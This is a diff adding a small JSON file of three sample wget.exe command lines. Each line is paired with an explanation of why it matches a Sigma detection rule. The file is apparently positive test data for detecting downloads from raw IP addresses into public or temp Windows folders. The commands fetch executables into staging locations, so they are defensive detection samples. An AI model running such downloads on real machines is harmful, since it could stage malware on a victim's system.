@@ -1,0 +1,14 @@
+[
+  {
+    "output": "wget.exe --output-document=\"C:\\Users\\Public\\download.txt\" http://192.168.1.1/file.exe",
+    "explanation": "This command uses wget.exe to download a file from an IP address and save it to a suspicious location. It includes the --output-document flag, which matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "wget.exe -O 'C:\\Windows\\Temp\\data.exe' http://10.0.0.1/resource.bin",
+    "explanation": "This command uses wget.exe with the short form of the -O flag to save a file to a suspicious Windows directory. It includes an IP address in the URL, matching the Sigma rule's detection logic."
+  },
+  {
+    "output": "wget.exe -O C:\\Temp\\sample.zip http://192.168.0.100/software.exe",
+    "explanation": "This command uses wget.exe with the -O flag to save a file to a suspicious location. The command line includes an IP address, which matches the Sigma rule's detection logic."
+  }
+]
